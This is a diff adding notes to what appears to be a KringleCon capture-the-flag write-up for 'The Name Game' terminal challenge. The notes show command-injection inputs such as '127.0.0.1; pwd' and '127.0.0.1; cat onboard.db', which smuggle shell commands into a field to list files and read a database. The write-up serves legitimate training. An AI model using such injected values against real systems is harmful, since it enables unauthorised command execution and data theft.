@@ -12,5 +12,9 @@ curl -X POST -d "status=on" --http2-prior-knowledge http://localhost:8080
 ## The Name Game Terminal Challenge
 [URL] https://docker.kringlecon.com/?challenge=pwshmenu&id=fb959815-faef-43e8-b792-67398d577b5b
 ```
-
+1) Run the program to see what options we have
+2) I tried command injection and it worked (127.0.0.1; pwd)
+3) I used this command injection to enumerate the files and cat the database (127.0.0.1; ls -lah)
+3a) (127.0.0.1; cat onboard.db) to get Mr. Chan's first name
+4) Finally, ran the runtoanswer binary (127.0.0.1; ./runtoanswer)
 ```
